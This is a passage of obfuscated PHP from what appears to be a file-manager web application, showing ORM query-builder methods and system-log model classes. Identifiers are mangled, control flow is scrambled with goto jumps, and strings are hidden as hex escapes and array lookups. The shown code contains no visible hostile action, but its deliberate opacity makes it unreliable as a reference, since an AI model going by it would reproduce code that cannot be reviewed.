return $this->db->execute($CÚ°ª∂à…ù); } protected function parseSql($DòÊ∫˘èØÇ, $A°ñë‘èÓ) { $B‡ø‰‹ñ¢„ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!0 === $A°ñë‘èÓ) { $d»å‰Òñ≥Ú = $this->_parseOptions(); $DòÊ∫˘èØÇ = $this->db->parseSql($DòÊ∫˘èØÇ, $d»å‰Òñ≥Ú); } elseif (is_array($A°ñë‘èÓ)) { $A°ñë‘èÓ = array_map(array($this->db, $B‡ø‰‹ñ¢„[328]), $A°ñë‘èÓ); $DòÊ∫˘èØÇ = vsprintf($DòÊ∫˘èØÇ, $A°ñë‘èÓ); } else { $DòÊ∫˘èØÇ = strtr($DòÊ∫˘èØÇ, array($B‡ø‰‹ñ¢„[329] => $this->getTableName(), $B‡ø‰‹ñ¢„[330] => think_config($B‡ø‰‹ñ¢„[229]))); } $this->db->setModel($this->name); return $DòÊ∫˘èØÇ; } public function db($fœÇ—Ã˘Ï = '', $FÕ÷æö¢ˆ¬ = '', $EœÃˆÖñ∫∑ = array()) { goto f‘¬Øÿäõ∂; F¥∞±òóı∆: static $a¿⁄Îéî€ï = array(); if (!isset($a¿⁄Îéî€ï[$fœÇ—Ã˘Ï]) || isset($a¿⁄Îéî€ï[$fœÇ—Ã˘Ï]) && $FÕ÷æö¢ˆ¬ && $Cóíäåâœî[$fœÇ—Ã˘Ï] != $FÕ÷æö¢ˆ¬) { if (!empty($FÕ÷æö¢ˆ¬) && is_string($FÕ÷æö¢ˆ¬) && !1 === strpos($FÕ÷æö¢ˆ¬, $F£√±Ú÷÷å[8])) { $FÕ÷æö¢ˆ¬ = think_config($FÕ÷æö¢ˆ¬); } $a¿⁄Îéî€ï[$fœÇ—Ã˘Ï] = Db::getInstance($FÕ÷æö¢ˆ¬); } elseif (NULL === $FÕ÷æö¢ˆ¬) { $a¿⁄Îéî€ï[$fœÇ—Ã˘Ï]->close(); unset($a¿⁄Îéî€ï[$fœÇ—Ã˘Ï]); return; } if (!empty($EœÃˆÖñ∫∑)) { if (is_string($EœÃˆÖñ∫∑)) { parse_str($EœÃˆÖñ∫∑, $EœÃˆÖñ∫∑); } foreach ($EœÃˆÖñ∫∑ as $e·úÀﬂ¿Àô => $C•åÊµ∆¢¿) { $this->setProperty($e·úÀﬂ¿Àô, $C•åÊµ∆¢¿); } } goto dºüàπ⁄≤å; dºüàπ⁄≤å: $Cóíäåâœî[$fœÇ—Ã˘Ï] = $FÕ÷æö¢ˆ¬; $this->db = $a¿⁄Îéî€ï[$fœÇ—Ã˘Ï]; $this->_after_db(); goto BíùÔ–ëé€; BíùÔ–ëé€: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto E≠Ω∫ôâˆá; f‘¬Øÿäõ∂: $F£√±Ú÷÷å =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($F£√±Ú÷÷å[33] === $fœÇ—Ã˘Ï && $this->db) { return $this->db; } static $Cóíäåâœî = array(); goto F¥∞±òóı∆; E≠Ω∫ôâˆá: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $E∆é´ú€ö• = get_class($this); if ($E∆é´ú€ö• == $_SERVER[£¿ÌÙëü¡¯¯][331]) { return $this->name; } $this->name = substr($E∆é´ú€ö•, 0, -5); } return $this->name; } public function getTableName() { $b…ıâ∆ÚÓ– =& $_SERVER[£¿ÌÙëü¡¯¯]; if (empty($this->trueTableName)) { $FˆË◊®ªà÷ = !empty($this->tablePrefix) ? $this->tablePrefix : $b…ıâ∆ÚÓ–[33]; if (!empty($this->tableName)) { $FˆË◊®ªà÷ .= $this->tableName; } else { $FˆË◊®ªà÷ .= think_parse_name($this->name); } $this->trueTableName = strtolower($FˆË◊®ªà÷); } return (!empty($this->dbName) ? $this->dbName . $b…ıâ∆ÚÓ–[94] : $b…ıâ∆ÚÓ–[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $E‘êÕƒı∆∆ =& $_SERVER[£¿ÌÙëü¡¯¯]; return isset($this->fields[$E‘êÕƒı∆∆[236]]) ? $this->fields[$E‘êÕƒı∆∆[236]] : $this->pk; } public function getDbFields() { $FèÛ€«ºÇ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (isset($this->options[$FèÛ€«ºÇ[264]])) { $c÷Ë™»„öÍ = $this->db->getFields($this->options[$FèÛ€«ºÇ[264]]); return $c÷Ë™»„öÍ ? array_keys($c÷Ë™»„öÍ) : !1; } if ($this->fields) { $c÷Ë™»„öÍ = $this->fields; unset($c÷Ë™»„öÍ[$FèÛ€«ºÇ[235]], $c÷Ë™»„öÍ[$FèÛ€«ºÇ[236]], $c÷Ë™»„öÍ[$FèÛ€«ºÇ[237]], $c÷Ë™»„öÍ[$FèÛ€«ºÇ[234]]); return $c÷Ë™»„öÍ; } return !1; } public function data($FåéﬂÇèä” = '') { $aÖòû◊€‰† =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($aÖòû◊€‰†[33] === $FåéﬂÇèä” && !empty($this->data)) { return $this->data; } if (is_object($FåéﬂÇèä”)) { $FåéﬂÇèä” = get_object_vars($FåéﬂÇèä”); } elseif (is_string($FåéﬂÇèä”)) { parse_str($FåéﬂÇèä”, $FåéﬂÇèä”); } elseif (!is_array($FåéﬂÇèä”)) { think_exception(think_lang($aÖòû◊€‰†[256])); } $this->data = $FåéﬂÇèä”; return $this; } public function join($f–úŸ¥¨±Ÿ) { $E‡∂õé˜˜ø =& $_SERVER[£¿ÌÙëü¡¯¯]; if (is_array($f–úŸ¥¨±Ÿ)) { $this->options[$E‡∂õé˜˜ø[267]] = $f–úŸ¥¨±Ÿ; } elseif (!empty($f–úŸ¥¨±Ÿ)) { $this->options[$E‡∂õé˜˜ø[267]][] = $f–úŸ¥¨±Ÿ; } return $this; } public function union($cÇƒÒ⁄ÏÔø, $f◊ŸÆèÍŒ• = false) { goto cŒÂËãì§ã; EÒùÂªçç÷: return $this; goto d©É†¥∑∆ë; EÖÔ∏ÿ∂Ô£: if (is_object($cÇƒÒ⁄ÏÔø)) { $cÇƒÒ⁄ÏÔø = get_object_vars($cÇƒÒ⁄ÏÔø); } if (is_string($cÇƒÒ⁄ÏÔø)) { $B·ﬁÖú≤∞¥ = $cÇƒÒ⁄ÏÔø; } elseif (is_array($cÇƒÒ⁄ÏÔø)) { if (isset($cÇƒÒ⁄ÏÔø[0])) { $this->options[$EÓπñ’Í◊Ø[332]] = array_merge($this->options[$EÓπñ’Í◊Ø[332]], $cÇƒÒ⁄ÏÔø); return $this; } else { $B·ﬁÖú≤∞¥ = $cÇƒÒ⁄ÏÔø; } } else { think_exception(think_lang($EÓπñ’Í◊Ø[256])); } $this->options[$EÓπñ’Í◊Ø[332]][] = $B·ﬁÖú≤∞¥; goto EÒùÂªçç÷; cŒÂËãì§ã: $EÓπñ’Í◊Ø =& $_SERVER[£¿ÌÙëü¡¯¯]; if (empty($cÇƒÒ⁄ÏÔø)) { return $this; } if ($f◊ŸÆèÍŒ•) { $this->options[$EÓπñ’Í◊Ø[332]][$EÓπñ’Í◊Ø[333]] = !0; } goto EÖÔ∏ÿ∂Ô£; d©É†¥∑∆ë: } public function cache($F≤ßÜ®Óªü = true, $aÆâÎ√Â◊ﬂ = null, $DƒŒ∂˘õÜà = '') { $fÖä∫áÎãË =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!1 !== $F≤ßÜ®Óªü) { $this->options[$fÖä∫áÎãË[334]] = array($fÖä∫áÎãË[90] => $F≤ßÜ®Óªü, $fÖä∫áÎãË[324] => $aÆâÎ√Â◊ﬂ, $fÖä∫áÎãË[29] => $DƒŒ∂˘õÜà); } return $this; } public function field($C§ó∫ÉœÉÃ, $B°•å√∑ÎÏ = false) { $F⁄’¡÷¬‹π =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!0 === $C§ó∫ÉœÉÃ) { $cÁÖÙµ≥Ö◊ = $this->getDbFields(); $C§ó∫ÉœÉÃ = $cÁÖÙµ≥Ö◊ ? $cÁÖÙµ≥Ö◊ : $F⁄’¡÷¬‹π[173]; } elseif ($B°•å√∑ÎÏ) { if (is_string($C§ó∫ÉœÉÃ)) { $C§ó∫ÉœÉÃ = explode($F⁄’¡÷¬‹π[47], $C§ó∫ÉœÉÃ); } $cÁÖÙµ≥Ö◊ = $this->getDbFields(); $C§ó∫ÉœÉÃ = $cÁÖÙµ≥Ö◊ ? array_diff($cÁÖÙµ≥Ö◊, $C§ó∫ÉœÉÃ) : $C§ó∫ÉœÉÃ; } $this->options[$F⁄’¡÷¬‹π[258]] = $C§ó∫ÉœÉÃ; return $this; } public function scope($a¨∑åÿÖﬂ⁄ = '', $Eû≥ÀÚáˆÊ = NULL) { $dÊ¿àªÿêì =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($dÊ¿àªÿêì[33] === $a¨∑åÿÖﬂ⁄) { if (isset($this->_scope[$dÊ¿àªÿêì[34]])) { $b˘Û‚≤ü¥  = $this->_scope[$dÊ¿àªÿêì[34]]; } else { return $this; } } elseif (is_string($a¨∑åÿÖﬂ⁄)) { $b‰∆áùÖœÊ = explode($dÊ¿àªÿêì[47], $a¨∑åÿÖﬂ⁄); $b˘Û‚≤ü¥  = array(); foreach ($b‰∆áùÖœÊ as $aÜÑä∑ñÏâ) { if (!isset($this->_scope[$aÜÑä∑ñÏâ])) { continue; } $b˘Û‚≤ü¥  = array_merge($b˘Û‚≤ü¥ , $this->_scope[$aÜÑä∑ñÏâ]); } if (!empty($Eû≥ÀÚáˆÊ) && is_array($Eû≥ÀÚáˆÊ)) { $b˘Û‚≤ü¥  = array_merge($b˘Û‚≤ü¥ , $Eû≥ÀÚáˆÊ); } } elseif (is_array($a¨∑åÿÖﬂ⁄)) { $b˘Û‚≤ü¥  = $a¨∑åÿÖﬂ⁄; } if (is_array($b˘Û‚≤ü¥ ) && !empty($b˘Û‚≤ü¥ )) { $this->options = array_merge($this->options, array_change_key_case($b˘Û‚≤ü¥ )); } return $this; } public function where($Eªßﬂœéùœ, $bü¯µìØæà = null) { $fºç‡∂Î∂¯ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!is_null($bü¯µìØæà) && is_string($Eªßﬂœéùœ)) { if (!is_array($bü¯µìØæà)) { $bü¯µìØæà = func_get_args(); array_shift($bü¯µìØæà); } $bü¯µìØæà = array_map(array($this->db, $fºç‡∂Î∂¯[328]), $bü¯µìØæà); $Eªßﬂœéùœ = vsprintf($Eªßﬂœéùœ, $bü¯µìØæà); } elseif (is_object($Eªßﬂœéùœ)) { $Eªßﬂœéùœ = get_object_vars($Eªßﬂœéùœ); } if (is_string($Eªßﬂœéùœ) && $fºç‡∂Î∂¯[33] != $Eªßﬂœéùœ) { $c„‡—Ïﬂπ⁄ = array(); $c„‡—Ïﬂπ⁄[$fºç‡∂Î∂¯[335]] = $Eªßﬂœéùœ; $Eªßﬂœéùœ = $c„‡—Ïﬂπ⁄; } if (isset($this->options[$fºç‡∂Î∂¯[260]])) { $this->options[$fºç‡∂Î∂¯[260]] = array_merge($this->options[$fºç‡∂Î∂¯[260]], $Eªßﬂœéùœ); } else { $this->options[$fºç‡∂Î∂¯[260]] = $Eªßﬂœéùœ; } return $this; } public function limit($A∫∂ÆêÉéµ, $aö‰¥Ç©±  = null) { $f»ä◊∑Ã¥ó =& $_SERVER[£¿ÌÙëü¡¯¯]; $this->options[$f»ä◊∑Ã¥ó[277]] = is_null($aö‰¥Ç©± ) ? $A∫∂ÆêÉéµ : $A∫∂ÆêÉéµ . $f»ä◊∑Ã¥ó[47] . $aö‰¥Ç©± ; return $this; } public function page($AÂ¯•èóã€, $càˆ¢œö∫Ÿ = null) { $BÉÌãœı»ü =& $_SERVER[£¿ÌÙëü¡¯¯]; $this->options[$BÉÌãœı»ü[336]] = is_null($càˆ¢œö∫Ÿ) ? $AÂ¯•èóã€ : $AÂ¯•èóã€ . $BÉÌãœı»ü[47] . $càˆ¢œö∫Ÿ; return $this; } public function comment($BÆúÕ˜´‡Ù) { $this->options[$_SERVER[£¿ÌÙëü¡¯¯][337]] = $BÆúÕ˜´‡Ù; return $this; } public function setProperty($Eáﬂæ≈ Í’, $A·ÑË¢´ô•) { if (property_exists($this, $Eáﬂæ≈ Í’)) { $this->{$Eáﬂæ≈ Í’} = $A·ÑË¢´ô•; } return $this; } } goto B‘≤ê¢ »ÿ; CˆÒ‚å°¡ì: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\155\56\x4c\x69\x67\150\164\x41\x70\160"; public $modelType = "\x53\x79\x73\x74\x65\155\x4f\x70\164\151\157\156"; public $field = array("\x6e\x61\155\x65", "\147\x72\157\x75\160", "\144\145\x73\143", "\143\x6f\156\x74\145\156\x74"); public function listData($D◊Ò›Ωπäß = false, $bìŒ–ÔñÉÒ = "\155\157\x64\x69\x66\x79\124\151\x6d\145", $FﬂÁÌ∆”¬© = true) { return parent::listData($D◊Ò›Ωπäß, $bìŒ–ÔñÉÒ, $FﬂÁÌ∆”¬©); } public function remove($E≤õ¢∫ó◊“) { $dä˘Óá™÷ö = $this->findByName($E≤õ¢∫ó◊“); if (!$dä˘Óá™÷ö) { return !1; } return parent::remove($dä˘Óá™÷ö[$_SERVER[£¿ÌÙëü¡¯¯][364]]); } public function add($A„©«Æ˘ç†) { if ($this->findByName($A„©«Æ˘ç†[$_SERVER[£¿ÌÙëü¡¯¯][28]])) { return !1; } return parent::insert($A„©«Æ˘ç†); } public function update($Dß÷ÇÖΩÃé, $BŸŒ¯Ê›Ñﬂ) { $FÈ¥‡⁄«ìô =& $_SERVER[£¿ÌÙëü¡¯¯]; $BºÎ¶À‚ª‘ = $this->findByName($Dß÷ÇÖΩÃé); $EÜçå€î—ı = $this->findByName($BŸŒ¯Ê›Ñﬂ[$FÈ¥‡⁄«ìô[28]]); if (!$BºÎ¶À‚ª‘ || $EÜçå€î—ı && $EÜçå€î—ı[$FÈ¥‡⁄«ìô[364]] != $BºÎ¶À‚ª‘[$FÈ¥‡⁄«ìô[364]]) { return !1; } return parent::update($BºÎ¶À‚ª‘[$FÈ¥‡⁄«ìô[364]], $BŸŒ¯Ê›Ñﬂ); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\163\164\145\155\x5f\154\x6f\x67"; protected $dataAuto = array(array("\143\162\x65\141\164\145\124\151\x6d\x65", "\x74\151\x6d\x65", "\x69\156\x73\x65\162\164", "\x66\x75\x6e\143\164\x69\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $F⁄ÖÑ·‘´ =& $_SERVER[£¿ÌÙëü¡¯¯]; return array($F⁄ÖÑ·‘´[2264] => LNG($F⁄ÖÑ·‘´[2265]), $F⁄ÖÑ·‘´[2266] => LNG($F⁄ÖÑ·‘´[2267]), $F⁄ÖÑ·‘´[1954] => LNG($F⁄ÖÑ·‘´[2268]), $F⁄ÖÑ·‘´[2269] => LNG($F⁄ÖÑ·‘´[2270]), $F⁄ÖÑ·‘´[2271] => LNG($F⁄ÖÑ·‘´[2272]), $F⁄ÖÑ·‘´[2273] => LNG($F⁄ÖÑ·‘´[2274]), $F⁄ÖÑ·‘´[2275] => LNG($F⁄ÖÑ·‘´[2276]), $F⁄ÖÑ·‘´[2277] => LNG($F⁄ÖÑ·‘´[2278]), $F⁄ÖÑ·‘´[1985] => LNG($F⁄ÖÑ·‘´[2279]), $F⁄ÖÑ·‘´[2280] => LNG($F⁄ÖÑ·‘´[2281]), $F⁄ÖÑ·‘´[2282] => LNG($F⁄ÖÑ·‘´[2283]), $F⁄ÖÑ·‘´[2284] => LNG($F⁄ÖÑ·‘´[2285]), $F⁄ÖÑ·‘´[2286] => LNG($F⁄ÖÑ·‘´[2287]), $F⁄ÖÑ·‘´[1983] => LNG($F⁄ÖÑ·‘´[2288]), $F⁄ÖÑ·‘´[1988] => LNG($F⁄ÖÑ·‘´[2289]), $F⁄ÖÑ·‘´[2290] => LNG($F⁄ÖÑ·‘´[2291]), $F⁄ÖÑ·‘´[2292] => LNG($F⁄ÖÑ·‘´[2293]), $F⁄ÖÑ·‘´[2294] => LNG($F⁄ÖÑ·‘´[2295]), $F⁄ÖÑ·‘´[2296] => LNG($F⁄ÖÑ·‘´[2297]), $F⁄ÖÑ·‘´[1991] => LNG($F⁄ÖÑ·‘´[2298]), $F⁄ÖÑ·‘´[1992] => LNG($F⁄ÖÑ·‘´[2299]), $F⁄ÖÑ·‘´[2300] => LNG($F⁄ÖÑ·‘´[2301]), $F⁄ÖÑ·‘´[2302] => LNG($F⁄ÖÑ·‘´[2303]), $F⁄ÖÑ·‘´[2304] => LNG($F⁄ÖÑ·‘´[2305]), $F⁄ÖÑ·‘´[2306] => LNG($F⁄ÖÑ·‘´[2307]), $F⁄ÖÑ·‘´[2308] => LNG($F⁄ÖÑ·‘´[2309]), $F⁄ÖÑ·‘´[1986] => LNG($F⁄ÖÑ·‘´[2310]), $F⁄ÖÑ·‘´[2311] => LNG($F⁄ÖÑ·‘´[2312]), $F⁄ÖÑ·‘´[2313] => LNG($F⁄ÖÑ·‘´[2314]), $F⁄ÖÑ·‘´[2315] => LNG($F⁄ÖÑ·‘´[2315]), $F⁄ÖÑ·‘´[2316] => LNG($F⁄ÖÑ·‘´[1958]), $F⁄ÖÑ·‘´[2317] => LNG($F⁄ÖÑ·‘´[2318]), $F⁄ÖÑ·‘´[2319] => LNG($F⁄ÖÑ·‘´[2320]), $F⁄ÖÑ·‘´[2321] => LNG($F⁄ÖÑ·‘´[2322]), $F⁄ÖÑ·‘´[2323] => LNG($F⁄ÖÑ·‘´[2324]), $F⁄ÖÑ·‘´[2325] => LNG($F⁄ÖÑ·‘´[2325]), $F⁄ÖÑ·‘´[2326] => LNG($F⁄ÖÑ·‘´[2327]), $F⁄ÖÑ·‘´[2328] => LNG($F⁄ÖÑ·‘´[2329]), $F⁄ÖÑ·‘´[2330] => LNG($F⁄ÖÑ·‘´[2331]), $F⁄ÖÑ·‘´[2332] => LNG($F⁄ÖÑ·‘´[2333]), $F⁄ÖÑ·‘´[2334] => LNG($F⁄ÖÑ·‘´[2335]), $F⁄ÖÑ·‘´[2336] => LNG($F⁄ÖÑ·‘´[2337])); } private function typeFile() { $E∆‹¯∏√ùõ =& $_SERVER[£¿ÌÙëü¡¯¯]; $cı±ÿ‚¿€ç = array($E∆‹¯∏√ùõ[1988] => array($E∆‹¯∏√ùõ[1989]), $E∆‹¯∏√ùõ[2284] => array($E∆‹¯∏√ùõ[2338]), $E∆‹¯∏√ùõ[2286] => array($E∆‹¯∏√ùõ[2339]), $E∆‹¯∏√ùõ[1983] => array($E∆‹¯∏√ùõ[1984]), $E∆‹¯∏√ùõ[2292] => array(), $E∆‹¯∏√ùõ[2294] => array(), $E∆‹¯∏√ùõ[2296] => array(), $E∆‹¯∏√ùõ[1991] => array($E∆‹¯∏√ùõ[1993]), $E∆‹¯∏√ùõ[1992] => array($E∆‹¯∏√ùõ[1993]), $E∆‹¯∏√ùõ[2300] => array($E∆‹¯∏√ùõ[2340]), $E∆‹¯∏√ùõ[2302] => array($E∆‹¯∏√ùõ[2340]), $E∆‹¯∏√ùõ[2304] => array($E∆‹¯∏√ùõ[2341]), $E∆‹¯∏√ùõ[2290] => array($E∆‹¯∏√ùõ[2342]), $E∆‹¯∏√ùõ[2306] => array($E∆‹¯∏√ùõ[2343]), $E∆‹¯∏√ùõ[2308] => array($E∆‹¯∏√ùõ[2344]), $E∆‹¯∏√ùõ[1986] => array($E∆‹¯∏√ùõ[1987])); return $cı±ÿ‚¿€ç; } private function typeAll() { goto D“ß…∑‹¿ö; D“ß…∑‹¿ö: $aëÜ¢É¢ø£ =& $_SERVER[£¿ÌÙëü¡¯¯]; $búˆ≠…ÁÑﬂ = $this->typeList; $Eæ◊êﬂäèÙ = array_filter($this->typeFile()); goto FËæÒËΩê™; FËæÒËΩê™: foreach ($Eæ◊êﬂäèÙ as $B€›«⁄ı•ﬂ => $e≥•éø≈ÕÇ) { $búˆ≠…ÁÑﬂ[$e≥•éø≈ÕÇ[0]] = $búˆ≠…ÁÑﬂ[$B€›«⁄ı•ﬂ]; } $búˆ≠…ÁÑﬂ[$aëÜ¢É¢ø£[1993]] = LNG($aëÜ¢É¢ø£[2345]); $búˆ≠…ÁÑﬂ[$aëÜ¢É¢ø£[2340]] = LNG($aëÜ¢É¢ø£[2346]); goto bßüÜŒé™ü; bßüÜŒé™ü: return $búˆ≠…ÁÑﬂ; goto f¢øå´∆Ê; f¢øå´∆Ê: } public function addLog($BÏ—ø—êæô, $d‹æ‚ø´¬ı = array()) { goto c‚ËæÃ´Óê; B¿æÇÌ√‡ß: parent::add($d‹æ‚ø´¬ı); goto F˜ö± ®ﬂÿ; aî‡Çëˆà”: $C≥âˆ§‘¥ﬁ = get_client_ip(); if (!$d‹æ‚ø´¬ı || strlen(json_encode($d‹æ‚ø´¬ı)) >= 1024) { $d‹æ‚ø´¬ı = array($aÜ§¨Çä¥ú[2347] => $C≥âˆ§‘¥ﬁ); } else { if (is_array($d‹æ‚ø´¬ı)) { $d‹æ‚ø´¬ı[$aÜ§¨Çä¥ú[2347]] = $C≥âˆ§‘¥ﬁ; } else { $d‹æ‚ø´¬ı = array($aÜ§¨Çä¥ú[1009] => $d‹æ‚ø´¬ı, $aÜ§¨Çä¥ú[2347] => $C≥âˆ§‘¥ﬁ); } } $d‹æ‚ø´¬ı = array($aÜ§¨Çä¥ú[1339] => Session::sign(), $aÜ§¨Çä¥ú[1340] => $e¬´öø°™á, $aÜ§¨Çä¥ú[29] => $BÏ—ø—êæô, $aÜ§¨Çä¥ú[1342] => json_encode($d‹æ‚ø´¬ı)); goto B¿æÇÌ√‡ß; c‚ËæÃ´Óê: $aÜ§¨Çä¥ú =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!isset($this->typeList[$BÏ—ø—êæô])) { return; } $e¬´öø°™á = USER_ID ? USER_ID : (isset($d‹æ‚ø´¬ı[$aÜ§¨Çä¥ú[1349]]) ? $d‹æ‚ø´¬ı[$aÜ§¨Çä¥ú[1349]] : 0); goto aî‡Çëˆà”; F˜ö± ®ﬂÿ: } public function remove($e∂ßçˆÛÜ÷) { $this->where(array($_SERVER[£¿ÌÙëü¡¯¯][382] => $e∂ßçˆÛÜ÷))->delete(); } private function _makeOrder($AéŸ⁄ñùÙœ = '') { goto fàÌΩÁ…ª”; fàÌΩÁ…ª”: $F»˜Ìû©ëÕ =& $_SERVER[£¿ÌÙëü¡¯¯]; $E¯‚ìßŸáÈ = $F»˜Ìû©ëÕ[184]; $eé†µó’ÌÑ = array($F»˜Ìû©ëÕ[398] => $F»˜Ìû©ëÕ[399], $F»˜Ìû©ëÕ[400] => $F»˜Ìû©ëÕ[401]); goto CÌç©êê¢â; E±∫Œ≥¬√»: return $this->order($AéŸ⁄ñùÙœ); goto cı°¥¨òö¶; CÌç©êê¢â: $d˜Ïä™è€Æ = Input::get($F»˜Ìû©ëÕ[404], $F»˜Ìû©ëÕ[7], $F»˜Ìû©ëÕ[2149], array($F»˜Ìû©ëÕ[2090], $F»˜Ìû©ëÕ[400])); $d˜Ïä™è€Æ = $eé†µó’ÌÑ[$d˜Ïä™è€Æ]; $AéŸ⁄ñùÙœ = $AéŸ⁄ñùÙœ . "{$E¯‚ìßŸáÈ}\x20{$d˜Ïä™è€Æ}"; goto E±∫Œ≥¬√»; cı°¥¨òö¶: } public function get($eèıï†ºèÏ = '') { goto Fﬁ–ìªÓ¡≤; Fﬁ–ìªÓ¡≤: $cπ≠ìﬂµπØ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$eèıï†ºèÏ) { show_json(array()); } $Aﬁ¨‹ÖÃ¿π = array(); goto fïÿ£Ñ÷Àü; A…‰∑√¨å: if (!empty($eèıï†ºèÏ[$cπ≠ìﬂµπØ[2347]])) { $Aﬁ¨‹ÖÃ¿π[$cπ≠ìﬂµπØ[401]] = array($cπ≠ìﬂµπØ[748], "\45{$eèıï†ºèÏ[$cπ≠ìﬂµπØ[2347]]}\45"); } $e“Œ⁄üœåá = $this->_makeOrder()->where($Aﬁ¨‹ÖÃ¿π)->selectPage(); if (empty($e“Œ⁄üœåá[$cπ≠ìﬂµπØ[350]])) { show_json(array(), !0, $e“Œ⁄üœåá[$cπ≠ìﬂµπØ[347]]); } goto B—ﬂó◊ìá; fïÿ£Ñ÷Àü: if ($eèıï†ºèÏ[$cπ≠ìﬂµπØ[1349]]) { $Aﬁ¨‹ÖÃ¿π[$cπ≠ìﬂµπØ[1349]] = $eèıï†ºèÏ[$cπ≠ìﬂµπØ[1349]]; } if (isset($eèıï†ºèÏ[$cπ≠ìﬂµπØ[689]])) { $dÈ∞…á‹£© = $eèıï†ºèÏ[$cπ≠ìﬂµπØ[689]]; $C÷ª∏¬÷Ç” = isset($eèıï†ºèÏ[$cπ≠ìﬂµπØ[690]]) ? $eèıï†ºèÏ[$cπ≠ìﬂµπØ[690]] : time(); $Aﬁ¨‹ÖÃ¿π[$cπ≠ìﬂµπØ[184]] = array($cπ≠ìﬂµπØ[318], array($dÈ∞…á‹£©, $C÷ª∏¬÷Ç”)); } if ($eèıï†ºèÏ[$cπ≠ìﬂµπØ[29]]) { $A‘ÈÊäÜÖÚ = explode($cπ≠ìﬂµπØ[47], $eèıï†ºèÏ[$cπ≠ìﬂµπØ[29]]); $Eì∞´û¢›í = $this->typeFile(); $bà≥ÁÆÓÛµ = array(); foreach ($A‘ÈÊäÜÖÚ as $A∞ãÔÀ•©Ù) { $bà≥ÁÆÓÛµ[] = $A∞ãÔÀ•©Ù; if (isset($Eì∞´û¢›í[$A∞ãÔÀ•©Ù])) { $bà≥ÁÆÓÛµ = array_merge($bà≥ÁÆÓÛµ, $Eì∞´û¢›í[$A∞ãÔÀ•©Ù]); } } $bà≥ÁÆÓÛµ = array_unique($bà≥ÁÆÓÛµ); if ($bà≥ÁÆÓÛµ) { $Aﬁ¨‹ÖÃ¿π[$cπ≠ìﬂµπØ[29]] = array($cπ≠ìﬂµπØ[7], $bà≥ÁÆÓÛµ); } } goto A…‰∑√¨å; B—ﬂó◊ìá: $e“Œ⁄üœåá[$cπ≠ìﬂµπØ[350]] = $this->logList($e“Œ⁄üœåá[$cπ≠ìﬂµπØ[350]]); return $e“Œ⁄üœåá; goto F¨¬–Ÿ√Ó; F¨¬–Ÿ√Ó: } private function ipAddress(&$bäØÙﬂÍÆ¬) { $eÃÁº±¡È  =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!empty($bäØÙﬂÍÆ¬[$eÃÁº±¡È [2347]])) { $fôÇíñÛ⁄Ö = IpLocation::get($bäØÙﬂÍÆ¬[$eÃÁº±¡È [2347]]); if ($fôÇíñÛ⁄Ö == $eÃÁº±¡È [2348]) { $fôÇíñÛ⁄Ö = $eÃÁº±¡È [2349]; } } else { $fôÇíñÛ⁄Ö = LNG($eÃÁº±¡È [2350]); } $bäØÙﬂÍÆ¬[$eÃÁº±¡È [2351]] = $fôÇíñÛ⁄Ö; } private function getSourceList(&$D¬•¥Ø¿¥π) { $dæâ…∞Á›Û =& $_SERVER[£¿ÌÙëü¡¯¯]; $DÛ…éïµãò = array(); foreach ($D¬•¥Ø¿¥π as $cÓ´òÌö‚§ => $FÖ≤Ω≈¥ûÀ) { $e‘«ﬁ‡úçò = json_decode($FÖ≤Ω≈¥ûÀ[$dæâ…∞Á›Û[401]], !0); if (strpos($FÖ≤Ω≈¥ûÀ[$dæâ…∞Á›Û[29]], $dæâ…∞Á›Û[2184]) !== 0) { goto e ¬Ø‘¬ÉÙ; Aê∑ºÁùˆ◊: continue; goto CœòÌﬁ–ÎÚ; Fá¯ΩËëËÑ: $DÛ…éïµãò[] = $e‘«ﬁ‡úçò[$dæâ…∞Á›Û[366]] = $CæŒŸÔıƒ®[$dæâ…∞Á›Û[366]]; $DÛ…éïµãò[] = $e‘«ﬁ‡úçò[$dæâ…∞Á›Û[2183]] = $CæŒŸÔıƒ®[$dæâ…∞Á›Û[457]]; $D¬•¥Ø¿¥π[$cÓ´òÌö‚§][$dæâ…∞Á›Û[401]] = json_encode($e‘«ﬁ‡úçò); goto Aê∑ºÁùˆ◊; e ¬Ø‘¬ÉÙ: if (!isset($e‘«ﬁ‡úçò[$dæâ…∞Á›Û[76]]) || strpos($FÖ≤Ω≈¥ûÀ[$dæâ…∞Á›Û[29]], $dæâ…∞Á›Û[2352]) !== 0) { continue; } if (!IO::init($e‘«ﬁ‡úçò[$dæâ…∞Á›Û[76]])) { continue; } if (!($CæŒŸÔıƒ® = IO::infoFull($e‘«ﬁ‡úçò[$dæâ…∞Á›Û[76]]))) { continue; } goto Fá¯ΩËëËÑ; CœòÌﬁ–ÎÚ: } $DÛ…éïµãò[] = $e‘«ﬁ‡úçò[$dæâ…∞Á›Û[366]]; $DÛ…éïµãò[] = $e‘«ﬁ‡úçò[$dæâ…∞Á›Û[2183]]; if ($e‘«ﬁ‡úçò[$dæâ…∞Á›Û[29]] == $dæâ…∞Á›Û[484]) { $DÛ…éïµãò[] = $e‘«ﬁ‡úçò[$dæâ…∞Á›Û[401]][$dæâ…∞Á›Û[980]]; $DÛ…éïµãò[] = $e‘«ﬁ‡úçò[$dæâ…∞Á›Û[401]][$dæâ…∞Á›Û[981]]; } if ($e‘«ﬁ‡úçò[$dæâ…∞Á›Û[29]] == $dæâ…∞Á›Û[2191]) { 